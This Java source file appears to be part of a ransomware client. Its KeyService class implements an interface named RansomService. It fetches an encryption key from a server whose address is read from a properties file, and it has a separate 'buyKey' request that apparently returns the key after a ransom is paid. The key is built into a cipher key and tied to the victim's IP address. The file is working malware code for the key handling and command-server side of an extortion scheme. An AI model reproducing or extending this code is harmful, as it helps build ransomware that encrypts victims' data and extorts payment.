package Agent.services;

import java.io.IOException;
import java.io.InputStream;
import java.util.Properties;

import javax.crypto.spec.SecretKeySpec;

import org.json.JSONObject;

import Agent.Utils.HttpUtil;
import Agent.entites.CryptoKey;
import Agent.exceptions.CryptoException;
import Agent.exceptions.HttpResException;
import Agent.exceptions.InOutException;
import Agent.exceptions.JsonException;

public class KeyService implements RansomService, ConfigureProps {

	private String urlgetKey;
	private String urlbuyKey;
	private Properties properties;
	private InputStream is;

	public KeyService() throws InOutException {
		getProperties();
	}

	@Override
	public CryptoKey getKey() throws CryptoException {
		return sendRequest(urlgetKey);
	}

	@Override
	public CryptoKey buyKey() throws CryptoException {
		return sendRequest(urlbuyKey);
	}

	private CryptoKey sendRequest(String url) throws CryptoException {
		try {
			final JSONObject json = (JSONObject) HttpUtil.get(url);
			final String al = json.get("algorithm").toString();
			final byte[] decodedKey = json.get("_key").toString().getBytes();
			return new CryptoKey(json.get("ip").toString(), new SecretKeySpec(decodedKey, 0, decodedKey.length, al),
					al);
		} catch (InOutException | HttpResException | JsonException e) {
			throw new CryptoException("Request denied", e);
		}
	}

	@Override
	public void getProperties() throws InOutException {
		properties = new Properties();
		is = getClass().getResourceAsStream("/application.properties");
		try {
			properties.load(is);
			urlbuyKey = properties.getProperty("server.url.buy");
			urlgetKey = properties.getProperty("server.url.get");
		} catch (IOException e) {
			throw new InOutException("Could not find properties file", e);
		}

	}
}